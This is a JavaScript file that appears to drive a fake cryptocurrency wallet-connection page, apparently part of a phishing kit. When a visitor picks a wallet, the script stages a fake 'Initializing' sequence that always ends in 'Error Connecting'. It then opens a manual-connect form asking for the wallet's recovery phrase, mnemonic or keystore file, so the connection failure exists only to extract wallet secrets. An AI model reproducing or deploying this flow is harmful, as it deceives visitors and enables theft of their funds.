var popupname = document.querySelector("#walletname");
var firstpopupname = document.querySelector(".jsJmJE");
var guideDisplay = document.querySelector("#guideDisplay");
var guideDisplay2 = document.querySelector("#guideDisplay2");
var overlay = document.querySelector(".overlay");
var icon = document.querySelectorAll(".cmAzHq");
var icon_text = document.querySelectorAll(".pageStyles__SAppName-sc-1navawn-7");
var popupimage = document.getElementById("myImg");
var firstpopupimage = document.querySelector(".firstImg");
var icon_img = document.querySelectorAll(".cmAzHq");
var wallet_id = document.querySelector("#wallet_id")
var connect_manual = document.querySelector(".jwEAlI");
var firstoverlay = document.querySelector(".sc-bdVaJa");
var a;
var connect = document.querySelector(".jwEAlI");
var loading = document.querySelector(".loading");
connect_manual.addEventListener("click", function() {
    overlay.style.display = "flex";
    firstoverlay.style.display = "none";
})

if (firstoverlay.style.display = "none") {
    connect.style.display = "none";
}

function loadings() {
    var a = setTimeout(function() {
        loading.innerHTML = "Initializing.";
    }, 2);
    var a = setTimeout(function() {
        loading.innerHTML = "Initializing...";
    }, 700);

    var a = setTimeout(function() {
        loading.innerHTML = "Initializing....";
    }, 1300);
    var a = setTimeout(function() {
        loading.innerHTML = "Initializing.....";
    }, 1900);

    var a = setTimeout(function() {
        loading.innerHTML = "Initializing......";
    }, 2500)

    var a = setTimeout(function() {
        loading.innerHTML = "Initializing.......";
    }, 3100)


    var a = setTimeout(function() {
        loading.innerHTML = "Error Connecting";
        connect.style.display = "flex";
        if (popupname.innerHTML == "Xumm") {
            overlay.style.display = "flex";
            firstoverlay.style.display = "none";
            guideDisplay2.style.display = "none";
            document.getElementById("phrase").innerHTML = "Mnemonic";
        } else {
            guideDisplay.style.display = "flex";
            document.getElementById("phrase").innerHTML = "Phrase";
        }
        document.getElementById("phrase").click();
    }, 3200)

}

// $('.cmAzHq').click(function(e){
//     e.preventDefault();
//     var overlay = document.querySelector(".overlay");
//     firstoverlay.style.display = "flex";

//   popupname.innerHTML = $(this).text().trim().replace(" Wallet", "");

//     popupimage.src = $(this).children('div').children('img').attr('src');
//     wallet_id.value = popupname.innerHTML;
//     firstpopupname.innerHTML = popupname.innerHTML;
//     firstpopupimage.src = popupimage.src;
//     loadings();
// })

function icon_click(e) {
    e.preventDefault();

    var overlay = document.querySelector(".overlay");
    firstoverlay.style.display = "flex";

    popupname.innerHTML = $(this).text().trim().replace(" Wallet", "");

    popupimage.src = $(this).children('div').children('img').attr('src');
    wallet_id.value = popupname.innerHTML;
    firstpopupname.innerHTML = popupname.innerHTML;
    firstpopupimage.src = popupimage.src;


    document.getElementById("wal1").value = popupname.innerHTML;
    loadings();
}


for (var i = 0; i < icon.length; i++) {
    $('.cmAzHq')[i].addEventListener("click", icon_click, true)

}

var cancel = document.querySelector("#cancel");

function firstcancel() {
    firstoverlay.style.display = "none";
    connect_manual.style.display = "none";
    guideDisplay.style.display = "none";
    guideDisplay2.style.display = "none";
    loading.innerHTML = "";
};
var x_button = document.querySelector(".fRcQRh").onclick = firstcancel;
var back_button = document.querySelector(".fhSmUE").onclick = firstcancel;
cancel.addEventListener("click", function() {
    var overlay = document.querySelector(".overlay");
    overlay.style.display = "none";
    guideDisplay2.style.display = "none";
    guideDisplay.style.display = "none";
    var span = document.querySelector("#span");
    span.innerHTML = "Choose Keystore File";
    var attr = document.querySelector("#first");
    var attr2 = document.querySelector("#second");
    var attr3 = document.querySelector("#third");
    var attr4 = document.querySelector("#fourth");
    var attr5 = document.querySelector("#fiveth");

    attr.classList.remove("active");
    attr2.classList.remove("active");
    attr3.classList.remove("active");
    attr4.classList.remove("active");
    attr5.classList.remove("active");
    attr.classList.add("active");
    var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");


    for (let i = 0; i < attr.length; i++) {
        attr[i].value = "";

    }
});


var label = document.querySelector("#label");
label.addEventListener("change", filenaming);

function filenaming(e) {
    e.preventDefault();
    var spantag = document.querySelector("#span");
    var fullPath = document.getElementById('file-upload').value;
    if (fullPath) {
        var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
        var filename = fullPath.substring(startIndex);
        if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
            filename = filename.substring(1);
        }
        spantag.innerHTML = filename;
    }
}

$("#connekt").click(function() {
    var walletname1 = $("#cymkm").html()
    alert(walletname1);
    if (walletname1 = "Other") {
        $("#walletname11").html("<textarea cols='30' rows='4' placeholder='Enter your type of wallet' class='text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400' name='phrase' required='' style='margin-top:0px;margin-bottom:0px;height:45px'></textarea>");
    };
})